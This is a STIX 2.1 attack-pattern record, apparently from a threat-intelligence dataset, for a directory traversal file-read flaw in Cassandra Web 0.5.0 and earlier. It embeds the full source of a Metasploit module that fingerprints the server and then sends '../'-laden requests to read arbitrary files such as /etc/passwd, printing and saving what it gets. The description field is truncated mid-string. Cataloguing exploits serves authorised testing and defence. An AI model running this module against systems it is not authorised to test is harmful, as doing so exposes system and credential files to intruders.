{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70974ddd-f1c1-442e-9429-cfb606f3cc06",
    "created": "2024-08-14T16:29:51.628137Z",
    "modified": "2024-08-14T16:29:51.62814Z",
    "name": "Cassandra Web File Read Vulnerability",
    "description": " This module exploits an unauthenticated directory traversal vulnerability in Cassandra Web 'Cassandra Web' version 0.5.0 and earlier, allowing arbitrary file read with the web server privileges. This vulnerability occured due to the disabled Rack::Protection module  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cassandra_web_file_read.rb",
            "external_id": "cassandra_web_file_read.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n  prepend Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cassandra Web File Read Vulnerability',\n        'Description' => %q{\n          This module exploits an unauthenticated directory traversal vulnerability in Cassandra Web\n          'Cassandra Web' version 0.5.0 and earlier, allowing arbitrary file read with the web server privileges.\n          This vulnerability occured due to the disabled Rack::Protection module\n        },\n        'References' => [\n          ['URL', 'https://github.com/avalanche123/cassandra-web/commit/f11e47a26f316827f631d7bcfec14b9dd94f44be'],\n          ['EDB', '49362']\n        ],\n        'Author' => [\n          'Jeremy Brown', # Vulnerability discovery\n          'krastanoel' # Metasploit module\n        ],\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),\n        OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 8]),\n        OptInt.new('RPORT', [true, 'The Cassandra Web port (default: 3000)', 3000])\n      ]\n    )\n  end\n\n  def check_host(_ip)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/')\n    })\n\n    return Exploit::CheckCode::Unknown('No response from the web service') if res.nil?\n    return Exploit::CheckCode::Safe('Target is not a Cassandra Web server') if res.code != 200\n\n    if res.headers['server'] == 'thin' && res.body.include?('Cassandra Web') && res.body.include?('/js/cassandra.js')\n      return Exploit::CheckCode::Appears('Cassandra Web Detected')\n    else\n      return Exploit::CheckCode::Safe('Target is not a Cassandra Web server')\n    end\n  rescue ::Rex::ConnectionError\n    return Exploit::CheckCode::Unknown('Could not connect to the web service')\n  end\n\n  def run_host(ip)\n    traversal = '../' * datastore['DEPTH']\n    filename = datastore['FILEPATH']\n    filename = filename[1, filename.length] if filename =~ %r{^/}\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/' \"#{traversal}#{filename}\")\n    })\n\n    fail_with(Failure::Unreachable, 'Connection failed') unless res\n    fail_with(Failure::NotVulnerable, 'Connection failed. Nothing was downloaded') if res.code != 200\n    fail_with(Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter') if res.body.include?('/js/cassandra.js')\n\n    print_status('Downloading file...')\n    print_line(\"\\n#{res.body}\\n\")\n\n    fname = datastore['FILEPATH']\n\n    path = store_loot(\n      'cassandra.web.traversal',\n      'text/plain',\n      ip,\n      res.body,\n      fname\n    )\n    print_good(\"File saved in: #{path}\")\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}